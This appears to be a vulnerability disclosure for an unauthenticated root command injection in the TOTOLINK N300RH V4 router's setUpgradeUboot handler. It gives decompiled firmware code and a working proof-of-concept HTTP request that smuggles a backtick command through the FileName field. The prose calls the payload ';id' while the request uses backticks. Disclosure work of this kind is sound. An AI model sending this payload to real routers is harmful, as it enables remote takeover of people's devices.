# Information

## Summary

**Title:**   
TOTOLINK N300RH V4 Unauthenticated OS Command Injection via `upgrade.so` `setUpgradeUboot` `FileName` Parameter

**Vendor:** TOTOLINK

**Product:** TOTOLINK N300RH V4 Wireless Router

**Vulnerability Type:** Command Injection (CWE‑78)

**Impact:**   
Remote, unauthenticated OS command execution as root via the web management interface.

## Affected Products and Versions

**Confirmed affected model:**

- TOTOLINK N300RH V4

**Tested / observed vulnerable firmware versions:**

- V6.1c.1353
- V6.1c.1390_B20191101

**Firmware download address:**   
https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/188/ids/36.html

> The vulnerability was verified on firmware version V6.1c.1390_B20191101. Earlier versions listed above share the same code pattern and are very likely affected as well.

## Overview

The vulnerability is located in the `setUpgradeUboot` handler within `upgrade.so`. The web management interface retrieves the user-controlled `FileName` parameter and passes it into the bootloader upgrade routine. This endpoint can be reached remotely without authentication and does not require user interaction.

The root cause is improper neutralization of externally supplied input before it is embedded into shell command strings. The `FileName` value is forwarded to `mtd_write_bootloader()`, where it is inserted directly into command templates and executed through `CsteSystem()`. Because no sanitization or escaping is applied, shell metacharacters in `FileName` can terminate the intended command context and inject arbitrary operating system commands.

## Vulnerability Details

The vulnerable function (from the router’s firmware, decompiled) is:

```c
Var = (const char *)websGetVar(a2, "FileName", "");
v7 = (const char *)websGetVar(a2, "ContentLength", "");
...
if ( !fork(v17) )
{
  sleep(2);
  mtd_write_bootloader(Var, 0, v16);
  exit(1);
}

int __fastcall mtd_write_bootloader(const char *a1, int a2, int a3)
{
  _BYTE v7[512];

  if ( a2 > 0 )
  {
    sprintf(v7, "dd if=%s of=/tmp/uboot2.img bs=%d skip=1", a1, a2);
    CsteSystem(v7, 0);
    sprintf(v7, "dd if=/tmp/uboot2.img of=%s bs=%d count=1", a1, a3);
    CsteSystem(v7, 0);
    sprintf(v7, "rm -f /tmp/uboot2.img", a3);
    CsteSystem(v7, 0);
  }

  snprintf(v7, 512, "mtd -r write %s %s", a1, "u-boot");
  return CsteSystem(v7, 0);
}
```

![The `FileName` parameter is retrieved from the request and passed into `mtd_write_bootloader()`.](images/image-20250531100234-x8iguaa.png)

![The `mtd_write_bootloader()` routine constructs a shell command using attacker-controlled input and executes it through `CsteSystem()`.](images/image-20250531100247-79s2tms.png)

1. **Unvalidated external input**  
   The `FileName` parameter is obtained directly from the HTTP request via `websGetVar(a2, "FileName", "")` and then passed into `mtd_write_bootloader()` without validation or sanitization.

2. **Command string construction**  
   Inside `mtd_write_bootloader()`, the attacker-controlled value is embedded into shell command strings such as `dd if=%s ...` and `mtd -r write %s %s`. This allows an attacker to inject shell metacharacters through `FileName`.

3. **Execution with system‑level privileges**  
   The constructed command is executed via `CsteSystem(v7, 0)`. Based on the provided verification results, the injected command runs with root privileges, as demonstrated by the returned output `uid=0(root) gid=0(root)`.

Overall, this matches **CWE‑78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')** .

## Attack Scenario and Exploitability

### Preconditions

- The target device must expose the web management interface, including `/cgi-bin/cstecgi.cgi`, over the network.
- No authentication or user interaction is required; a remote attacker can directly submit a crafted request to the vulnerable handler.

### Example Exploit (PoC)

A crafted request can inject an additional shell command through the `FileName` parameter. One observed payload wrote the output of `id` into a web-accessible file:

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

{
  "topicurl":"setUpgradeUboot",
  "ContentLength":"0",
  "FileName":"123`id > /usr/lib/lighttpd/web/123.asp`"
}
```

When the firmware constructs the command `mtd -r write %s %s`, the injected `;id > /usr/lib/lighttpd/web/123.asp` segment is executed by the shell.

### Verification of Exploit

The HTTP request used for exploitation is shown below:

![Raw HTTP request containing the injected `FileName` payload.](images/image-20250531101639-w0l9g2b.png)

Retrieving the generated web-accessible file confirms execution of the injected command and root-level privileges:

![HTTP response showing `uid=0(root) gid=0(root)`.](images/image-20250531101645-9onxatx.png)
